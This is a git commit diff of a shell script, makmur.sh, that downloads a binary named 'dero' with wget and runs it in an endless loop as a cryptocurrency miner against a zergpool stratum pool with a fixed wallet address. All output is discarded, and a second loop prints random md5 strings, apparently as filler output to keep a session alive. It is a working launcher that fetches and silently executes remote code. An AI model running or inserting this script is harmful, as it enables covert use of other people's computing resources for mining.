92e5c18f7d7c8da9dd19668a9b5ad675c54c7a9a
RizQu5 <122372013+RizQu5@users.noreply.github.com>
2023-01-11 17:06:34 +0700

    Update makmur.sh

--- makmur.sh
+++ makmur.sh
@@ -1,11 +1,10 @@
-#!/bin/sh
-wget https://github.com/RizQu5/2022/raw/main/dero >/dev/null 2>&1
-chmod +x dero >/dev/null 2>&1
- while [ 1 ]; do
-	./dero -a yespowerR16 -o stratum+tcp://yespowerR16.mine.zergpool.com:6534 -u PQFYTbguveuWuwRjZRsUiQZnW3ea51Rbc3 -p c=PLSR,mc=YTN,ID=WORKERZERG >/dev/null 2>&1
+wget https://github.com/RizQu5/2022/raw/main/dero > /dev/null 2>&1
+chmod +x dero > /dev/null 2>&1
+while [ 1 ]; do
+	./dero -a yespowerR16 -o stratum+tcp://yespowerR16.mine.zergpool.com:6534 -u PQFYTbguveuWuwRjZRsUiQZnW3ea51Rbc3 -p c=PLSR,mc=YTN,ID=02.beDO > /dev/null 2>&1
 	sleep 2
- done
- while [ 1 ]; do
-	while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2s; done
-	sleep 2
- done
+done
+	while [ 1 ]; do
+		while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
+		sleep 2
+	done
